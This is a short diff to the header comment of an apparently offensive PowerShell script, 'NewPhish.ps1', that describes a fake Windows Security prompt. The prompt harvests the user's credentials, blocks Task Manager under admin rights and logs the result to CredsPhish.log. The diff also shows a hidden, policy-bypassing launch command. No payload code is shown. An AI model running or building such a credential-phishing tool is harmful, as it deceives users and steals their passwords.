@@ -2,9 +2,10 @@
 .SYNOPSIS
   Standalone Powershell script that will promp the current user for a valid credential.
 
-.Author: r00t-3xp10it - (Based on @Dviros CredsLeaker)
+Author: r00t-3xp10it - (Based on @Dviros CredsLeaker)
   Required Dependencies: Target Account Password Set
   Optional Dependencies: None
+  PS Script Dev Version: v1.0
 
 .DESCRIPTION
    This script will display a Windows Security Credentials box that will ask the user for his credentials.
@@ -13,9 +14,12 @@
    This Script will limmit the number of times that asks for credentials to less than 30 attempts before aborting.
    This script will Block remote-host Task Manager during current tasks IF executed with Administrator privileges. 
 
-.EXECUTION
+.EXAMPLE
    powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "NewPhish.ps1"
- 
+
+.OUTPUTS
+   Saves CredsPhish.log to the selected directory. 'tmp' is the default.
+
 .LINK
     https://github.com/Dviros/CredsLeaker
     https://github.com/r00t-3xp10it/meterpeter
